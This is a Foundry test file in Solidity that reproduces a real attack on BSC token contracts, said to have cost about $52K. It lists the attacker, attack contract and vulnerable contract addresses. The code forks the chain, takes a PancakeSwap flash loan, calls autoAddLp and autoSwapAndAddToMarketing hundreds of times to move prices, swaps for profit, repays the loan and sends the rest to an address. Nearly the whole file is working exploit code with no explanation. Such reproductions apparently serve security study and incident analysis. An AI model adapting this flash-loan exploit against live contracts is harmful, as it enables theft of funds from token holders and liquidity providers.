// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$52K
// Attacker : https://bscscan.com/address/0xe9fac789c947f364f53c3bc28bb6e9e099526468
// Attack Contract : https://bscscan.com/address/0x87c75f8a69732bad999ce1fab464526856215c77
// Vulnerable Contract : https://bscscan.com/address/0x11cd2168fc420ae1375626655ab8f355f0075bd6
// Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0xf6ec3c22b718c3da17746416992bac7b65a4ef42ccf5b43cf0716c82bffc2844

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakePool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPancakeRouter {
    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
    function getAmountsIn(
        uint256 amountOut,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IHelper {
    function autoSwapAndAddToMarketing() external;
    function autoAddLp() external;
}

contract Token8633_9419_exp is Test {
    address immutable r = address(this);

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/bsc", 33_545_074);
        // vm.createSelectFork("https://rpc.ankr.com/bsc", bytes32(0xf6ec3c22b718c3da17746416992bac7b65a4ef42ccf5b43cf0716c82bffc2844));
    }

    IERC20 constant x0cca = IERC20(0x0cCa1055f3827b6D2f530d52c514E3699c98F3B9);
    IERC20 constant x55d3 = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant x8633 = IERC20(0x86335cb69e4E28fad231dAE3E206ce90849a5477);
    IPancakePair constant x5b4d = IPancakePair(0x5b4D39f3d6ab3Ee426Bc5B15fF65B1EeD8BB68C2);
    IPancakeRouter constant x10ed = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePool constant x92b7 = IPancakePool(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    IHelper constant x11cd = IHelper(0x11Cd2168fc420ae1375626655ab8f355F0075Bd6);
    IHelper constant x1281 = IHelper(0x128112aF3aF5478008c84d77c63561885FBBC438);
    address constant x5752 = 0x57528D1cf2b14Bb35781Df41099f10Cd927FF026;
    address constant x5a52 = 0x5a522C949F3DcBc30f511E20D72fb44B770f28e6;
    address constant x9a0c = 0x9a0Ccc75d0B8Ef0BeAc89ECA9f4dC17AD6770AAD;
    address constant xba0b = 0xBA0bcb1D0a2166D26a4Bfd9fAbb825369ab36209;

    function test() public {
        // vm.prank(0xe9FAc789C947f364f53C3BC28bB6E9e099526468, 0xe9FAc789C947f364f53C3BC28bB6E9e099526468);
        xd8ea4b59();
    }

    function xd8ea4b59() public {
        x92b7.flash(r, 1.1e24, 0, hex"30783030");
    }

    function pancakeV3FlashCallback(uint256, uint256, bytes memory) public {
        x55d3.balanceOf(r);
        x55d3.balanceOf(address(x5b4d));
        x55d3.balanceOf(x5752);
        x8633.balanceOf(address(x5b4d));
        x8633.balanceOf(address(x1281));
        x55d3.transfer(address(x1281), 12_963_077_939_873_677_887_580);
        for (uint256 i = 0; i < 130; i++) {
            x1281.autoAddLp();
        }

        address[] memory path = new address[](2);
        path[0] = address(x55d3);
        path[1] = address(x8633);
        x10ed.getAmountsOut(1e24, path);
        address[] memory path2 = new address[](2);
        path2[0] = address(x55d3);
        path2[1] = address(x0cca);
        x10ed.getAmountsIn(12_757_806_796_945_991_578_214_185_129_315, path2);
        x55d3.approve(address(x10ed), type(uint256).max);
        x0cca.approve(address(x10ed), type(uint256).max);
        x10ed.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            839_828_983_139_806_906_579, 0, path2, r, 1_700_144_157
        );
        x0cca.balanceOf(r);
        x55d3.transfer(address(x5b4d), 1e24);
        x5b4d.swap(0, 12_757_806_796_945_991_578_214_185_129_315, x5a52, "");
        x0cca.approve(x5a52, 12_757_806_796_945_991_578_214_185_129_315);
        x0cca.balanceOf(r);
        x0cca.transfer(x9a0c, 1_056_998_382_300_994_038_915_644_566_868);
        (bool success,) = x5a52.call(hex"004b2cc0");
        require(success, "Low-level call failed");
        x8633.balanceOf(r);
        for (uint256 i = 0; i < 900; i++) {
            x11cd.autoSwapAndAddToMarketing();
        }

        x8633.balanceOf(r);
        x8633.approve(address(x10ed), type(uint256).max);
        x55d3.approve(address(x10ed), type(uint256).max);
        address[] memory path3 = new address[](2);
        path3[0] = address(x8633);
        path3[1] = address(x55d3);
        x10ed.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            12_757_806_796_944_991_578_214_185_129_315, 0, path3, r, 1_700_144_157
        );
        x55d3.balanceOf(r);
        x55d3.balanceOf(r);
        x55d3.balanceOf(r);
        x55d3.transfer(address(x92b7), 1_100_110_000_000_000_000_000_000);
        x55d3.balanceOf(r);
        x55d3.transfer(xba0b, 26_362_092_911_372_968_412_790);
    }

    fallback() external payable {
        revert("no such function");
    }
}
